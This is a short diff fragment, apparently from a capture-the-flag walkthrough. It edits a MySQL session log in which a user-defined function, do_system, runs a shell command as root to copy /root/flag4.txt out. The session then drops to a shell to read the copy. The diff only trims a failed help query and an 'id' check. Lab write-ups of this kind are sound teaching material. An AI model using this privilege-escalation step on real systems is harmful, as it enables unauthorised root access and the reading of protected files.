@@ -277,17 +277,8 @@ mysql> select do_system('cat /root/flag4.txt > /tmp/out; chown www-data.www-data
 +-------------------------------------------------------------------------------+
 1 row in set (0.05 sec)
 
-mysql> \? sh
-\? sh
-
-Nothing found
-Please try to run 'help contents' for a list of all accessible topics
-
 mysql> \! sh
 \! sh
-$ id
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ cat /tmp/out
 cat /tmp/out
 ______                      
